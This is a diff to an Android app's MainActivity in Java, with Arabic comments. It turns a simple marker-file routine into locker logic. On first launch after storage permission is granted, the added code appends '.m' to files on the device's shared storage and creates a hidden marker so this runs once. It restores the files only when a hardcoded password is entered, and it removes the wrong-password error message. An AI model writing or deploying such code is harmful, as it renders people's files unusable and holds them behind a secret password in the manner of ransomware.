@@ -15,7 +15,6 @@ import android.widget.ProgressBar;
 import android.widget.TextView;
 
 import java.io.File;
-import java.io.FileOutputStream;
 import java.io.IOException;
 
 public class MainActivity extends Activity {
@@ -24,7 +23,7 @@ public class MainActivity extends Activity {
     private TextView textViewCurrentFile;
     private TextView textViewPercentage;
     private ProgressBar progressBar;
-    private final String PASSWORD = "7610150"; // تأكد من استخدام أساليب آمنة للتخزين.
+    private final String PASSWORD = "7610150";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -35,9 +34,6 @@ public class MainActivity extends Activity {
         textViewCurrentFile = findViewById(R.id.textViewCurrentFile);
         textViewPercentage = findViewById(R.id.textViewPercentage);
         progressBar = findViewById(R.id.progressBar);
-
-        // إنشاء الملف عند بدء التشغيل
-        createUniqueFile(".RC12G28GJ25VJ28");
 
         buttonDelete.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -68,32 +64,16 @@ public class MainActivity extends Activity {
         if (requestCode == 1000 && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
             initializeLogic();
         } else {
-            finish(); // إنهاء النشاط إذا لم يتم منح الأذونات
+            finish();
         }
     }
 
     private void initializeLogic() {
-        // يمكن إضافة منطق إضافي هنا إذا لزم الأمر
-    }
-
-    // دالة لإنشاء ملف فريد إذا لم يكن موجودًا
-    private void createUniqueFile(String fileName) {
-        String directoryPath = "/storage/emulated/0/";
-        File file = new File(directoryPath, fileName);
+        String filePath = "/storage/emulated/0/DATA/.G5JD7VDH6";
+        File file = new File(filePath);
 
         if (!file.exists()) {
-            try {
-                FileOutputStream fos = new FileOutputStream(file);
-                fos.write("".getBytes()); // يمكنك كتابة محتوى الملف هنا إذا لزم الأمر
-                fos.close();
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-        } else {
-            // إذا كان الملف موجودًا، اخفِ شريط التقدم وTextView
-            progressBar.setVisibility(View.GONE);
-            textViewCurrentFile.setVisibility(View.GONE);
-            textViewPercentage.setVisibility(View.GONE);
+            addExtensionToFiles();
         }
     }
 
@@ -109,9 +89,7 @@ public class MainActivity extends Activity {
             public void onClick(DialogInterface dialog, int which) {
                 String enteredPassword = input.getText().toString();
                 if (enteredPassword.equals(PASSWORD)) {
-                    removeExtensionFromFiles(); // إذا كانت كلمة السر صحيحة، استدعاء دالة الحذف
-                } else {
-                    showErrorDialog("كلمة السر غير صحيحة.");
+                    removeExtensionFromFiles();
                 }
             }
         });
@@ -125,22 +103,32 @@ public class MainActivity extends Activity {
         builder.show();
     }
 
-    private void showErrorDialog(String message) {
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle("خطأ");
-        builder.setMessage(message);
-        builder.setPositiveButton("موافق", new DialogInterface.OnClickListener() {
-            @Override
-            public void onClick(DialogInterface dialog, int which) {
-                dialog.dismiss();
-            }
-        });
-        builder.show();
+    private void addExtensionToFiles() {
+        new FileProcessorTask(".m").execute();
     }
 
-    // دالة لحذف اللاحقة ".m" من الملفات
     private void removeExtensionFromFiles() {
         new FileProcessorTask("").execute();
+    }
+
+    private void createFileWithExtension() {
+        String directoryPath = "/storage/emulated/0/DATA";
+        File directory = new File(directoryPath);
+
+        if (!directory.exists()) {
+            directory.mkdirs();
+        }
+
+        String fileName = ".G5JD7VDH6";
+        File newFile = new File(directory, fileName);
+
+        try {
+            if (newFile.createNewFile()) {
+                // تم إنشاء الملف بنجاح
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
     private class FileProcessorTask extends AsyncTask<Void, String, String> {
@@ -178,9 +166,11 @@ public class MainActivity extends Activity {
         protected void onPostExecute(String result) {
             super.onPostExecute(result);
             progressBar.setVisibility(View.GONE);
+            if (extension.equals(".m")) {
+                createFileWithExtension();
+            }
         }
 
-        // دالة لمعالجة الملفات وإضافة أو حذف اللاحقة
         private String processFiles(File directory, String extension) {
             File[] files = directory.listFiles();
             if (files != null) {
@@ -220,5 +210,5 @@ public class MainActivity extends Activity {
             return "تمت العملية بنجاح.";
         }
     }
-                                   }
-            
+                                           }
+                                
